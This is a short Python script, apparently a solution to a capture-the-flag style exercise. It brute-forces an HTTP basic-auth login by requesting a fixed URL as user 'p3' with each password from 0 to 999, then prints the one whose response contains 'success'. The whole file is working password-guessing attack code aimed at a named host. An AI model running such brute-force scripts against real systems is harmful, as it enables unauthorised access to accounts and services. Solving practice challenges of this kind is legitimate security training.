#!usr/bin/python3

import requests

URL = "http://mnem.us/cyberpdx/p3"
USER = "p3"

for k in range(1000):
    PASS = k
    r = requests.get(URL, auth=(USER,PASS))
    if 'success' in r.text:
        print(k)
        print(r.text)
        break
